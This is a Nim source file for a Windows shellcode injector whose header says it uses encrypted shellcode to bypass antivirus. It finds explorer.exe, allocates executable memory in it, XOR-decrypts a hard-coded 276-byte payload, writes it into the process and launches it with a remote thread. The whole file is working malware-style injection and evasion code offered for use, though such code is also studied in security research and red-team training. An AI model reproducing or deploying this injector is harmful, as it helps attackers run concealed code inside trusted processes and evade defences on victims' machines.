# Description: Extended shellcode injector that uses encrypted shellcode to bypass AV
# Author: Jakob Friedl
# Created On: 2023-12-23

import 
    winim, 
    strformat, strutils
from encrypt import decrypt, printBytes

# Status Codes 
template info(s: varargs[untyped]): untyped =
    echo "[*] ", s
template okay(s: varargs[untyped]): untyped = 
    echo "[+] ", s
template fail(s: varargs[untyped]): untyped = 
    echo "[-] ", s
template value(s: varargs[untyped]): untyped = 
    echo " ┗ [ ", s

const key: array[20, byte] = [0xa9, 0xb0, 0x47, 0xda, 0x90, 0xfc, 0x9d, 0x6c, 0x5c, 0x5f, 0x36, 0xf4, 0x84, 0x46, 0x2f, 0xa5, 0x53, 0xb6, 0x6f, 0x03]

proc getPID(process: string): DWORD = 
    var snapshot: HANDLE = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    var p: PROCESSENTRY32 
    p.dwSize = cast[DWORD](sizeof(p))

    if Process32First(snapshot, addr p): 
        while Process32Next(snapshot, addr p):
            var processName: string = ""
            for c in p.szExeFile:
                if c == 0:
                    break
                processName.add(char((int)c))

            if processName.toLowerAscii == process.toLowerAscii:
                CloseHandle(snapshot)
                return p.th32ProcessID
    else: 
        fail "Could not get snapshot of processes"
        CloseHandle(snapshot)
        return ERROR

proc inject[I, T](process: string, shellcode: var array[I, T]): int = 
    
    # Getting PID 
    info fmt"Getting PID for {process}"
    var pid = getPID(process)
    if pid == ERROR: 
        fail fmt"Could not get PID for {process} [error code: {GetLastError()}]"
        return ERROR
    else: 
        okay fmt"Got PID {pid} for {process}"

    # Getting handle to process
    info fmt"Getting handle to {process}"
    var hProcess: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, 0, pid)
    if hProcess == 0: 
        fail fmt"Could not get handle to {process} [error code: {GetLastError()}]"
        return ERROR
    else: 
        okay fmt"Got handle to {process}"
        value fmt"hProcess: {repr(hProcess)}"

    # Allocating memory in remote process
    info fmt"Allocating memory in {process}"
    var lpAddress: LPVOID = VirtualAllocEx(hProcess, nil, shellcode.len, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    if lpAddress == nil: 
        fail fmt"Could not allocate memory in {process} [error code: {GetLastError()}]"
        return ERROR
    else: 
        okay fmt"Allocated memory in {process}"
        value fmt"lpAddress: {repr(lpAddress)}"

    # Decrypting shellcode 
    info fmt"Decrypting shellcode"
    info fmt"XOR key to use: {repr(key)}"
    var decrypted = decrypt(shellcode, key)
    okay fmt"Successfully decrypted shellcode"
    value ""
    printBytes(decrypted)

    # Writing shellcode to allocated memory in process
    info fmt"Writing shellcode to lpAddress"
    var bytesWritten: SIZE_T = 0
    if WriteProcessMemory(hProcess, lpAddress, decrypted.addr, decrypted.len, addr bytesWritten) == 0:
        fail fmt"Could not write shellcode to process {process} [error code: {GetLastError()}]"
        return ERROR
    okay fmt"Wrote {bytesWritten} bytes to {repr(lpAddress)}"

    # Creating remote thread to execute shellcode
    info fmt"Creating remote thread"
    var tid: DWORD = 0
    var hThread: HANDLE = CreateRemoteThread(hProcess, nil, 0, cast[LPTHREAD_START_ROUTINE](lpAddress), nil, 0, addr tid)
    if hThread == 0: 
        fail fmt"Could not start remote thread [error code: {GetLastError()}]"
        return Error

    okay fmt"Created remote thread."
    value fmt"hThread: {repr(hThread)}"
    value fmt"TID: {tid}"

    # Waiting for thread to finish
    info fmt"Waiting for thread to finish"
    if WaitForSingleObject(hThread, INFINITE) == WAIT_FAILED: 
        fail fmt"Could not wait for thread to finish [error code: {GetLastError()}]"
        return ERROR
    okay fmt"Thread finished"

    # Cleaning up
    info fmt"Cleaning up"
    CloseHandle(hThread)
    CloseHandle(hProcess)

when defined(windows): 

    # Result of the encrypt.exe program that encrypts the shellcode using a XOR key
    # nim c -r .\encrypt.nim
    var shellcode: array[276,byte] = [
    byte 0x55,0xf8,0xc4,0x3e,0x60,0x14,0x5d,0x6c,0x5c,0x5f,0x77,0xa5,
    0xc5,0x16,0x7d,0xf4,0x05,0xfe,0x5e,0xd1,0xcc,0xf8,0xcc,0x88,
    0xf0,0xb4,0x16,0x3e,0x44,0x17,0xbd,0xa6,0xa4,0x0e,0xa4,0xd7,
    0x03,0xfe,0x60,0xb4,0xe3,0xfa,0x0a,0xeb,0x59,0xb4,0xac,0xac,
    0xf0,0x63,0x57,0x88,0x86,0x6a,0x0f,0xe4,0x92,0x7f,0x62,0x42,
    0xa8,0x71,0xa5,0x37,0xc2,0xbd,0xcc,0x24,0xd7,0x0d,0x16,0x7f,
    0xc6,0x7a,0x67,0xa4,0x83,0x3d,0xef,0x8b,0xa9,0xb0,0x47,0x92,
    0x15,0x3c,0xe9,0x0b,0x14,0x5e,0xe6,0xa4,0x0f,0x0e,0x37,0xe1,
    0xd8,0xf6,0x4f,0x4a,0xa8,0x60,0xa4,0x8c,0xd8,0x03,0x54,0x2d,
    0xd7,0x6b,0xbe,0xbc,0x85,0x90,0x62,0x94,0x9a,0xfe,0x5e,0xc3,
    0x05,0xf1,0x86,0x13,0x9d,0xbd,0x9c,0xad,0x64,0xbf,0x43,0x05,
    0xc8,0x45,0x63,0x81,0x5b,0xf3,0x56,0xd2,0xdc,0x68,0x1f,0x9e,
    0x1b,0xbc,0xb9,0x25,0x5d,0x8f,0x50,0xb5,0x0f,0x4a,0x67,0xe1,
    0xd8,0xf6,0x73,0x4a,0xa8,0x60,0x06,0x51,0x94,0x74,0xd5,0x6d,
    0x8c,0x1e,0x6e,0xb5,0xdc,0x18,0x76,0xff,0x12,0xee,0x2e,0x5a,
    0xe8,0xea,0x0f,0x59,0x7c,0xdc,0xdc,0x3e,0xa3,0xbf,0x6e,0xb5,
    0xdd,0x1c,0x67,0x2e,0x41,0x5f,0x38,0xfc,0x56,0x4f,0x1a,0x92,
    0x2a,0xfd,0x9d,0x6c,0x5c,0x5f,0x36,0xf4,0x84,0x0e,0xa2,0x28,
    0x52,0xb7,0x6f,0x03,0xe8,0x0a,0x76,0x51,0xff,0x7b,0x62,0xb9,
    0xe7,0xbf,0x2b,0xde,0x8e,0x07,0x95,0x03,0xc6,0x0b,0xf2,0xfc,
    0x7c,0xf8,0xc4,0x1e,0xb8,0xc0,0x9b,0x10,0x56,0xdf,0xcd,0x14,
    0xf1,0x43,0x94,0xe2,0x40,0xc4,0x00,0x69,0xa9,0xe9,0x06,0x53,
    0x4a,0x03,0x48,0x0f,0x3d,0x33,0x55,0xda,0xe1,0x3e,0x4a,0xa5]

    when isMainModule: 
        discard inject("explorer.exe", shellcode)
